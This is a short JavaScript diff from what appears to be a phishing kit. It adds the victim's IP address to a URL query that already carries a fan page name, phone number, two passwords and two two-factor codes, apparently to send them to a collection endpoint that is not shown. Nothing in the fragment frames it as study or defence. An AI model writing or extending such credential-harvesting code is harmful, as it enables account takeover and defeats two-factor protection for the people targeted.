@@ -62,9 +62,11 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
     url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
     url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
     //
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
     url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
     url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
     //
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
     url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
     url.searchParams.append('Second Two-Fa', data.secondTwoFa  ? data.secondTwoFa  : '');
 
